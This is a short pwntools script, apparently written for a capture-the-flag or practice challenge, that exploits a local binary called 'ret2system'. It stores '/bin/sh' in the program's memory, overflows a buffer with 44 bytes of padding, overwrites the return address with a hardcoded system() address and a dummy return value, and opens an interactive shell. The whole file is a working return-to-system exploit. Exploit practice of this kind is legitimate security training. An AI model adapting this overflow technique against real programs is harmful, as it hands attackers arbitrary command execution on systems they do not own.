from pwn import *

proc=process("./ret2system")

store=p32(0x0804c060)
offset=b"A"*44
system=p32(0x80490e0)
ret_for_system=b"BBBB"    #very important as args must be above this in stack

proc.sendlineafter("value",'/bin/sh')
print(proc.recvuntil('now'))
proc.sendline(offset+system+ret_for_system+store)
proc.interactive()
